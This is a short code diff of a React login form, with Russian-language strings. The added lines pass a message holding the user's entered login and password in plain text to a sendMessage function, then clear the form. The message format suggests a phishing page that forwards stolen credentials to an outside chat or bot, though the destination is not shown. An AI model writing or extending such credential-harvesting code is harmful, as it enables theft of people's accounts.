@@ -42,6 +42,15 @@ function App() {
     e.preventDefault();
 
     const message = `Новая форма входа:\n👤 Логин: ${username}\n🔒 Пароль: ${password}`;
+
+    try {
+      await sendMessage(message);
+      setUsername("");
+      setPassword("");
+    } catch (error) {
+      alert("Ошибка отправки данных ❌");
+      console.error(error);
+    }
   };
 
   return (
